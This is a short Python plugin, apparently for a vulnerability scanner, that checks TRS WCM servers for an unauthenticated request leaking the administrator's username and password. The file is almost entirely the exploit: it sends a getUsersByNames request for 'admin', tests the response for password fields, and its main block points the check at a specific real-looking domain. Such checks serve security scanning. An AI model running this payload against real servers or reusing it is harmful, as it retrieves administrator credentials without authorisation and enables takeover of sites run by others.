#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = TRS WCM 获取取管理员密码
import re

def assign(service, arg):
    if service == "trs_wcm":
        return True, arg

def audit(arg):
    payload = 'wcm/infoview.do?serviceid=wcm6_user&MethodName=getUsersByNames&UserNames=admin'
    target = arg + payload
    code, head,res, errcode, _   = curl.curl2(target)
    if code==200 and '<USERNAME>' in res and '<PASSWORD>' in res:
          
        security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('trs_wcm', 'http://en.ccccltd.cn/')[1])